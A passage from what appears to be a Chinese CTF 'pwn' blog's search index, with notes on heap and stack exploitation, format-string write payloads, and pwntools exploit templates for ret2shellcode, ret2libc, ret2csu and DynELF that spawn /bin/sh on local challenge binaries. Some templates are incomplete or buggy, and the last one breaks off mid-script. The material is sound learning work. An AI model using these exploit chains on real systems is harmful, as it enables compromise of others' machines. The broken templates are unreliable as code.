chunk时的fd指针，以实现fastbin dup。</p>\n<h4><span id=\"tcache-dup\">Tcache dup</span></h4><p>​        不管是2.27还是2.29，只要漏洞点足够强，那么这个技巧就能够简单地被实现。原理和fastbin dup几乎一样，就不多赘述了。</p>\n<h4><span id=\"unlink\">unlink</span></h4><p>​        布置fastbin的bk和fd，分别覆盖为 <code>target - 0x18</code>，<code>target - 0x10</code>，触发unlink后就能使为<code>target</code>指向<code>target - 0x18</code>    。32位需改机器字长。</p>\n<h4><span id=\"offbyone\">offbyone</span></h4><h5><span id=\"chunk-overlapping\">chunk overlapping</span></h5><p>​        一般是通过chunk overlapping先构造出uaf，再unlink劫持指针。</p>\n<h4><span id=\"堆溢出\">堆溢出</span></h4><h4><span id=\"unsorted-bin-attack\">unsorted bin attack</span></h4><p>​        前置知识是unsorted bin attack。当unsorted bin被取出时，会执行以下操作：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class=\"line\"> = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>\n<p>​        </p>\n<p>如果将其bk劫持，这样<code>bck-&gt;fd</code>就可以被修改为<code>unsorted_chunks (av)</code>，也就是任意地址+0x10 =<code>unsorted_chunks (av)</code>。     </p>\n<h4><span id=\"io_file\">IO_FILE</span></h4><p>​        因为利用条件比较复杂，所以目前也只做过经典例题。</p>\n<h5><span id=\"劫持vtable\">劫持vtable</span></h5><p>​        根据libc版本不同，利用方式也不同，2.23及以后的版本只能伪造vtable，之前的话可以直接修改。</p>\n<h5><span id=\"fsop\">fsop</span></h5><p>​        劫持<code>io_list_all</code>指针，使其指向fake chunk，在chunk中构造vtable。</p>\n<p>​        </p>\n<p>​</p>\n","categories":["Binary_security"],"tags":["Generalization"]},{"title":"pwn题中的一些奇怪的姿势","url":"/2021/08/03/sum_pwn%E9%A2%98%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%80%AA%E7%9A%84%E5%A7%BF%E5%8A%BF/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-cdTyAbnq\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  </p>\n<h3><span id=\"patch-alarm\">patch alarm</span></h3><p>比较弱智的一个操作，但是如果没注意到的话还是有一点点坑。</p>\n<p>一般来说许多题都喜欢在main函数里加alarm。</p>\n<p>alarm会导致调试的时候超时，如果没有解决的话基本不能调试。算最基础的的反调试手法了。</p>\n<p>ps:关于超时的那个报错当时还好好研究了一会儿来着。就是一个sigxxx，sigalarm好像，然后默认返回中止程序。</p>\n<p>解决方案也比较弱智。就是直接patch掉就好了。</p>\n<p>ida都关了懒得上图了。</p>\n<h3><span id=\"单双引号问题\">单双引号问题</span></h3><p>​        萌新赛出题的时候，出了一道非常简单的签到ret2text，但是非常疑惑地，怎么样都会EOF。</p>\n<p>​        然后索性调试一下，发现了奇点。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/EDFE9E0C6D3BC173B417FE06A8F28E18.png\" alt=\"EDFE9E0C6D3BC173B417FE06A8F28E18\"></p>\n<p>​        这边已经跳转到后门函数了，但是没有办法getshell。问题似乎出在参数上。本应该是<code>/bin/sh</code>，但是实际是<code>n/sh</code>，只有后面四个字节了。</p>\n<p>​        我去找了wiki上面类似题目做参考，发现正常情况下这里应该是这样：<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/DECB707DA78DA7002E7115E76713D24E.png\" alt=\"DECB707DA78DA7002E7115E76713D24E\"></p>\n<p>​        但是我的程序是这样：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/328953ED3A08C20DD6E4E20828BB5B56.png\" alt=\"328953ED3A08C20DD6E4E20828BB5B56\"></p>\n<p>​        然后发动传统艺能，控制变量找不同，发现问题出在<code>system(&#39;/bin/sh&#39;)</code>上。</p>\n<p>​        因为不怎么出这种直接给后门的题，我甚至不太清楚这个函数的写法，以至于想当然地认为这里单引号和双引号没有什么区别，就像在exp中的那些<code>(&#39;./&#39;)</code> <code>(&quot;./&quot;)</code>，看起来区别不大，实际上也没有什么影响。</p>\n<p>​        但是实际只要去查一查，就会发现其实区别很大。单引号压根就不是字符串。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。</p>\n<p>​        然后把单引号改成双引号之后，就getshell了。</p>\n<h3><span id=\"roputils\">roputils</span></h3><p>做ret2dl的时候难免会偷懒使用工具。</p>\n<p>但是这个工具并没有看起来那么和善。</p>\n<p>就怎么使用utils包我都研究了一会儿，然后发现只需要<code>import roputils</code>然后把相对应的那个py脚本放到同一路径下就好。</p>\n<p>但是紧接着第二问个问题，这个py脚本通篇是python2，而我日常无论哪个系统都是py3。</p>\n<p>所以解决方式有2</p>\n<ol>\n<li>将roputils转换为py3</li>\n<li>ubuntu切换py版本</li>\n</ol>\n<p>反正第一种就是用一个叫2to3的脚本。是py2自带的，使用需要先安装py2.7，我ubuntu18.04自带py2.7，所以就直接<code>2to3 -w roputils.py</code></p>\n<p>具体参数可以google。</p>\n<p>然后又来了第三个问题。</p>\n<p>来看我的报错。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">[+] Starting local process <span class=\"string\">&#x27;./babystack&#x27;</span>: pid <span class=\"number\">745</span></span><br><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">  File <span class=\"string\">&quot;babystack.py&quot;</span>, line <span class=\"number\">23</span>, <span class=\"keyword\">in</span> &lt;module&gt;</span><br><span class=\"line\">    rop = roputils.ROP(<span class=\"string\">&#x27;./babystack&#x27;</span>)</span><br><span class=\"line\">  File <span class=\"string\">&quot;/home/fur1n/pwn/week1/roputils.py&quot;</span>, line <span class=\"number\">440</span>, <span class=\"keyword\">in</span> __init__</span><br><span class=\"line\">    ELF.__init__(self, *args, **kwargs)</span><br><span class=\"line\">  File <span class=\"string\">&quot;/home/fur1n/pwn/week1/roputils.py&quot;</span>, line <span class=\"number\">85</span>, <span class=\"keyword\">in</span> __init__</span><br><span class=\"line\">    m = re.search(<span class=\"string\">r&#x27;^\\s*(?P&lt;key&gt;[^:]+):\\s+(?P&lt;value&gt;.+)$&#x27;</span>, line)</span><br><span class=\"line\">  File <span class=\"string\">&quot;/usr/lib/python3.6/re.py&quot;</span>, line <span class=\"number\">182</span>, <span class=\"keyword\">in</span> search</span><br><span class=\"line\">    <span class=\"keyword\">return</span> _<span class=\"built_in\">compile</span>(pattern, flags).search(string)</span><br><span class=\"line\">TypeError: cannot use a string pattern on a <span class=\"built_in\">bytes</span>-like <span class=\"built_in\">object</span></span><br></pre></td></tr></table></figure>\n<p>这个功能好像并不会在byte前加b。。。</p>\n<p>目前来说并没有发现解决方法。</p>\n<p>所以只能尝试更换默认的py版本。具体可以google</p>\n<h3><span id=\"main_arena与多线程\">main_arena与多线程</span></h3><p>在学习Tcache的时候遇到了一些比较奇怪的点，ctf权威指南pwn篇中对于Tcache的解释中第一段如下：</p>\n<blockquote>\n<p>Tcache全名为Thread Local Caching，它为每个线程创建一个缓存，里面包含了一些小堆块，无需对main_arena上锁即可使用。</p>\n</blockquote>\n<p>首先让我感到不解的就是，“无需对main_arena上锁即可使用”这句话。什么叫对main_arana上锁？之前也遇见过很多文章提到过这个”锁“的相关概念，但是它们从来都不是问题的重点，但是通常来说，正是一个个不懂的”无关紧要“的问题导致最后啥也看不懂的。</p>\n<p>所以在这篇文章中我们有必要从ctf pwn的角度去理解线程 main_arena。</p>\n<h4><span id=\"加锁\">加锁</span></h4><p>当<strong>多个线程同时操作同一个共享全局变量</strong>的时候，对线程上锁，保证同一时间一个对象只有一个线程在访问，可以解决资源占用问题，同时保证了数据的安全性。</p>\n<h4><span id=\"线程\">线程</span></h4><p>线程一般来说被进程包含：一个进程可以有很多线程来处理，每条线程并行执行不同的任务。</p>\n<p>比如说ptmalloc2这个是个进程，然后其中包含很多很多线程。</p>\n<p>其中会有一个<code>main_arena</code>,是整个ptmalloc2进程中的主线程，然后main_arena会有很多子线程，每个子线程包含很多连续的内存片段，被称为heap。每一个heap都有自己的heap_header，它们通过链表互相连接，且其中保存了指向其所属arena的指针。</p>\n<p>这么讲似乎有一些太过抽象。具体一点讲就是，在只有一个main_arena的时候，ptmalloc只能通过mmap和sbrk申请堆内存。</p>\n<blockquote>\n<p>在多线程的情况下，显然让所有的线程公用一个数据结构来获取内存块会造成十分惨烈的对锁的竞争，所以 ptmalloc 中间多了一层组织结构——arena。每个arena包含一些可用的内存区块，用一个 arena 级别的锁来控制访问。当线程比较少的时候，每个可以拥有自己的arena，而当 arena 数目超过允许最大值时，多个线程共享一个 arena 了。个线程第一次 malloc 的时候都会 attach 一个 arena 。除非这个 arena 被标记为破坏的（ARENA_CORRUPTION_BIT），否则该线程以后再 malloc 都会继续用这个 arena。</p>\n</blockquote>\n<p>之前ctf权威指南中有讲到，每一个子线程包含很多连续的内存片段，被称为heap。它们都有自己所属的arena。这句话很容易让人觉得——每一个子线程有且只有一个arena，但是还存在多对一的情况。</p>\n<p>但是对于ctf pwn来说，实际情况远远没有这么复杂，基本我们操作的所谓的堆，chunk这些概念，考点基本都是建立在单线程的情况下的，它们的arena也都是<code>main_arena</code>而并不是什么<code>non_main_arena</code>。并且只有<code>main_arena</code>    能够访问<code>heap</code>段，<code>non_main_arena</code>只能访问<code>mmap</code>映射区域。</p>\n<h4><span id=\"总结\">总结</span></h4><p>用比较简单的话来说，main_arena就是主线程中一个管理所有链表的关键的数据结构，我们可以通过它获得各个bins的偏移。以及利用指向它的fd来做一些不好的事情（）。承接之前的内容，我们在利用main_arena的同时也需要对其进行上锁，防止别的线程与它共用一个资源，然后之前Tcahce里的“无需对main_arena上锁”意思也很清楚了，因为考虑到效率。所以抛弃了一定的安全性。</p>\n<h4><span id=\"参考\">参考</span></h4><p><a href=\"https://zhuanlan.zhihu.com/p/24909781\">malloc x 线程</a></p>\n<p><a href=\"https://www.wangan.com/docs/1741\">GLibcHeap</a></p>\n","categories":["Binary_security"],"tags":["Generalization"]},{"title":"stack知识点总结","url":"/2022/04/06/sum_stack_summary/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-foOixrWm\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<h1><span id=\"stack\">stack</span></h1><h2><span id=\"控制程序执行流\">控制程序执行流</span></h2><h3><span id=\"栈溢出\">栈溢出</span></h3><h4><span id=\"ret2syscall\">ret2syscall</span></h4><p>​        利用程序自带的gadget，构造syscall。</p>\n<p>​        <a href=\"https://fuurinko.github.io/2022/03/21/一些板子/\">对应板子</a></p>\n<h4><span id=\"ret2libccsu\">ret2libc/csu</span></h4><p>​        比较模版化，值得一题的就是，<code>system()</code>的执行要求此时栈是16位对齐的，所以如果getshell失败不妨多ret一次。        </p>\n<h4><span id=\"ret2shellcode\">ret2shellcode</span></h4><p>​        在rwx的内存空间(不一定是栈）上写shellcode，其实利用的姿势挺多的，建议看看pwn.college的ShellcodeInjection module，会刷新世界观。</p>\n<p>​        普通的ret2shellcode一般要求我们leak输入的buf以跳转回去执行，但是还是因题而异，有的题还会对输入或者说要执行的shellcode进行过滤，反正花样挺多。</p>\n<h4><span id=\"srop\">srop</span></h4><p>​        提供了一种相对更加高级的rop方式，但是据我的经验一般srop能做普通rop也能做，只是相对来说exp更短。如果一定要srop的话，pwntools的srop模块会是一个很好的选择。</p>\n<h4><span id=\"ret2dlreslove\">ret2dlreslove</span></h4><p>​        当程序没有任何输出时，可以考虑这个利用方式。</p>\n<p>​        利用其实虽然复杂，原理比较好理解，简单的题也还是不难的。    </p>\n<p>​        无relro的情况只需要伪造<code>.dynamic</code>节中字符串表地址为目的地址就行。比如将<code>read()</code>字符串替换为<code>system()</code>字符串，然后读入<code>&quot;/bin/sh&quot;</code></p>\n<p>​        partial relro使得<code>.dynamic</code>只读，那么就需要伪造重定位表。</p>\n<p>​        full relro的话，就更加困难了，是需要利用到<code>dt_bug</code>找到<code>link_map</code>，再通过<code>link_map</code>找到<code>dl_runtime_resolve</code>函数的地址，然后再进行常规的利用。相当之复杂。</p>\n<h4><span id=\"ret2vsyscall\">ret2vsyscall</span></h4><p>​        当pie开启，我们如果能控制程序执行流，但是没有合适的gadget调整栈帧的话，可以利用位置不受pie影响的vsyscall作为ret gadget使用。</p>\n<p>​        vsyscall在程序中地址是固定的<code>0xffffffffff600000-0xffffffffff601000</code>,一般使用<code>0xffffffffff600007</code>等。</p>\n<h3><span id=\"泄露内存\">泄露内存</span></h3><h4><span id=\"格式化字符串\">格式化字符串</span></h4><h5><span id=\"泄露任意地址\">泄露任意地址</span></h5><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">--------获取栈变量对应的地址------------</span><br><span class=\"line\">%n<span class=\"variable\">$p</span> <span class=\"comment\">#输出栈上第n+1个格式化字符串输出参数</span></span><br><span class=\"line\">--------获取栈变量对应的字符串----------</span><br><span class=\"line\">%n<span class=\"variable\">$s</span><span class=\"comment\">#输出栈上第n+1个格式化字符串参数对应的字符串</span></span><br><span class=\"line\">--------获取任意地址内容---------------</span><br><span class=\"line\">addr%n<span class=\"variable\">$s</span>\t</span><br></pre></td></tr></table></figure>\n<h6><span id=\"extra\">Extra:</span></h6><p>​        对于格式化字符串地址偏移的计算，32位和64位并不完全相同，32位参数完全由栈传递，所以参数在栈上出现的位次即是偏移（要减去返回地址占的位次），但是64位传参前六位是由寄存器传参，因此在栈上找到的偏移需要加6。</p>\n<h4><span id=\"数组越界\">数组越界</span></h4><p>​        对数组的idx进行非法的索引，以输出相应内存中的数据。</p>\n<h4><span id=\"覆盖空字节\">覆盖空字节</span></h4><p>​        输入或者其他操作时，将字符串结尾的截断空字节覆盖，输出时则会无视截断持续输出，有可能造成内存泄露。这一点在堆题中同样非常好用，尤其是有时候输出字符串与堆结构体的地址相邻。</p>\n<h3><span id=\"修改内存\">修改内存</span></h3><h4><span id=\"格式化字符串\">格式化字符串</span></h4><h5><span id=\"利用fmt_payload模块自动化写入\">利用fmt_payload模块自动化写入</span></h5><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload = fmtstr_payload(offset, &#123;func_got : system_addr&#125;)</span><br></pre></td></tr></table></figure>\n<h5><span id=\"手工构造\">手工构造</span></h5><h6><span id=\"原理\">原理</span></h6><p><code>%n</code>参数不输出字符，但是把已成功输出的字符个数写入对应整形指针参数所指的变量。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">addr%k<span class=\"variable\">$n</span><span class=\"comment\">#k为格式化字符串偏移，addr为需要覆盖的地址</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">%hhn <span class=\"comment\">#向地址写入单字节</span></span><br><span class=\"line\">%hn <span class=\"comment\">#向地址写入双字节</span></span><br></pre></td></tr></table></figure>\n<p>#</p>\n","categories":["Binary_security"],"tags":["Generalization"]},{"title":"一些板子","url":"/2022/03/21/sum_%E4%B8%80%E4%BA%9B%E6%9D%BF%E5%AD%90/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-AUzvKNgY\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<h1><span id=\"stack\">stack</span></h1><h2><span id=\"ret2shellcode\">ret2shellcode</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./&quot;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./&quot;</span>)</span><br><span class=\"line\">shellcode = shellcraft.amd64.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;/flag&quot;</span>)\t\t</span><br><span class=\"line\">shellcode += shellcraft.amd64.read(<span class=\"string\">&#x27;rax&#x27;</span>, <span class=\"string\">&#x27;rsp&#x27;</span>, <span class=\"number\">0x20</span>)</span><br><span class=\"line\">shellcode += shellcraft.amd64.write(<span class=\"number\">1</span>, <span class=\"string\">&#x27;rsp&#x27;</span>, <span class=\"number\">0x20</span>)</span><br><span class=\"line\">shellcode = asm(shellcraft.amd64.sh())</span><br></pre></td></tr></table></figure>\n<h2><span id=\"ret2libc\">ret2libc</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./&quot;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">0ffset = </span><br><span class=\"line\"></span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">libc_start_main_got = elf.got[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>]</span><br><span class=\"line\">main = elf.symbols[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>* offset + p64(puts_plt) + p64(main) + p64(libc_start_main_got)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvline()</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">b&#x27;?&#x27;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_start_main_addr = u64(p.recv()[<span class=\"number\">0</span>:<span class=\"number\">8</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(p64(libc_start_main_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)</span><br><span class=\"line\">libcbase = libc_start_main_addr - libc.dump(<span class=\"string\">&#x27;__libc_start_main&#x27;</span>)</span><br><span class=\"line\">system_addr = libcbase + libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">binsh_addr = libcbase + libc.dump(<span class=\"string\">&#x27;str_bin_sh&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>* offset + p64(system_addr) + p64(<span class=\"number\">0xdeadbeef</span>) + p64(binsh_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2><span id=\"ret2csu\">ret2csu</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(&quot;&quot;)</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./level3_x64&quot;</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./level3_x64&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">0ffset = </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">csu_front_addr = <span class=\"number\">0x400690</span></span><br><span class=\"line\">csu_end_addr = <span class=\"number\">0x4006AA</span></span><br><span class=\"line\"></span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">libc_start_main_got = elf.got[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>]</span><br><span class=\"line\">main = elf.symbols[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">read_got = elf.got[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">main_addr = elf.symbols[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">csu</span>(<span class=\"params\">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class=\"line\">    <span class=\"comment\"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class=\"line\">    <span class=\"comment\"># rbx should be 0,</span></span><br><span class=\"line\">    <span class=\"comment\"># rbp should be 1,enable not to jump</span></span><br><span class=\"line\">    <span class=\"comment\"># r12 should be the function we want to call</span></span><br><span class=\"line\">    <span class=\"comment\"># rdi=edi=r15d</span></span><br><span class=\"line\">    <span class=\"comment\"># rsi=r14</span></span><br><span class=\"line\">    <span class=\"comment\"># rdx=r13</span></span><br><span class=\"line\">    payload = <span class=\"string\">b&#x27;a&#x27;</span> * offset </span><br><span class=\"line\">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class=\"line\">    payload += p64(csu_front_addr)</span><br><span class=\"line\">    payload += <span class=\"string\">&#x27;a&#x27;</span> * (offset - <span class=\"number\">0x48</span>)</span><br><span class=\"line\">    payload += p64(last)</span><br><span class=\"line\">    p.send(payload)</span><br><span class=\"line\">    sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">csu(<span class=\"number\">0</span>, <span class=\"number\">1</span>, write_got, <span class=\"number\">8</span>, write_got, <span class=\"number\">1</span>, main_addr)</span><br><span class=\"line\">write_addr = u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;write&#x27;</span>, write_addr)</span><br><span class=\"line\">libc_base = write_addr - libc.dump(<span class=\"string\">&#x27;write&#x27;</span>)</span><br><span class=\"line\">execve_addr = libc_base + libc.dump(<span class=\"string\">&#x27;execve&#x27;</span>)</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;execve_addr &#x27;</span> + <span class=\"built_in\">hex</span>(execve_addr))</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)</span></span><br><span class=\"line\"><span class=\"string\">libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">system_addr = libcbase + libc.dump(&#x27;system&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">log.success(&#x27;system_addr &#x27; + hex(system_addr))</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">csu(<span class=\"number\">0</span>, <span class=\"number\">1</span>, read_got, <span class=\"number\">16</span>, bss_base, <span class=\"number\">0</span>, main_addr)</span><br><span class=\"line\">p.send(p64(execve_addr) + <span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Hello, World\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">## execve(bss_base+8)</span></span><br><span class=\"line\">csu(<span class=\"number\">0</span>, <span class=\"number\">1</span>, bss_base, <span class=\"number\">0</span>, <span class=\"number\">0</span>, bss_base + <span class=\"number\">8</span>, main_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2><span id=\"dynelf\">DynELF</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># context.log_level = &#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./bof&#x27;</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./bof&#x27;</span>)</span><br><span class=\"line\">p.recvline()</span><br><span class=\"line\"></span><br><span class=\"line\">offset = <span class=\"number\">112</span></span><br><span class=\"line\">write_plt = elf.plt[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">read_plt = elf.plt[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">read_got = elf.got[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">start_addr = <span class=\"number\">0x080483d0</span></span><br><span class=\"line\">bss_addr = <span class=\"number\">0x0804a020</span></span><br><span class=\"line\">pppr_addr = <span class=\"number\">0x0804856c</span></span><br><span class=\"line\">ret_addr = <span class=\"number\">0x08048484</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leak</span>(<span class=\"params\">addr</span>):</span></span><br><span class=\"line\">\tpayload = <span class=\"string\">b&#x27;a&#x27;</span>*offset</span><br><span class=\"line\">\tpayload += p32(write_plt)</span><br><span class=\"line\">\tpayload += p32(ret_addr)</span><br><span class=\"line\">\tpayload += p32(<span class=\"number\">1</span>)</span><br><span class=\"line\">\tpayload += p32(addr)</span><br><span class=\"line\">\tpayload += p32(<span class=\"number\">4</span>)</span><br><span class=\"line\">\tp.send(payload)</span><br><span class=\"line\">\tdata = p.recv()</span><br><span class=\"line\">\tlog.info(<span class=\"string\">&quot;leaking: 0x%x --&gt; %s&quot;</span> % (addr, (data <span class=\"keyword\">or</span> <span class=\"string\">&#x27;&#x27;</span>).encode(<span class=\"string\">&#x27;hex&#x27;</span>)))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\">d = DynELF(leak,elf = elf)</span><br><span class=\"line\"></span><br><span class=\"line\">system_addr = d.lookup(<span class=\"string\">&#x27;system&#x27;</span>,<span class=\"string\">&#x27;libc&#x27;</span>)</span><br><span class=\"line\">log.info(<span class=\"string\">&quot;system address: 0x%x&quot;</span> % system_addr)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#ret2vuln</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*offset</span><br><span class=\"line\">payload += p32(read_plt)</span><br><span class=\"line\">payload += p32(pppr_addr)</span><br><span class=\"line\">payload += p32(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload += p32(bss_addr)</span><br><span class=\"line\">payload += p32(<span class=\"number\">8</span>)</span><br><span class=\"line\">payload += p32(system_addr)</span><br><span class=\"line\">payload += p32(ret_addr)</span><br><span class=\"line\">payload += p32(bss_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.send(<span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span 